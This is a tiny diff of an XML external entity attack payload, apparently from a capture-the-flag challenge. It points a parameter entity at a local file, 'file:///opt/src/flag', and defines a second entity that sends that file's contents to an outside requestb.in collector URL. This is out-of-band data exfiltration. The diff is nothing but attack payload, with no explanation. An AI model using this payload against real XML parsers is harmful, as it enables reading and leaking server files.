@@ -1,3 +1,2 @@
-<!ENTITY % p1 SYSTEM "http://requestb.in/1gxggx91">
+<!ENTITY % p1 SYSTEM "file:///opt/src/flag">
 <!ENTITY % p2 "<!ENTITY &#37; e1 SYSTEM 'http://requestb.in/1gxggx91?%p1;'> ">
-%p2;
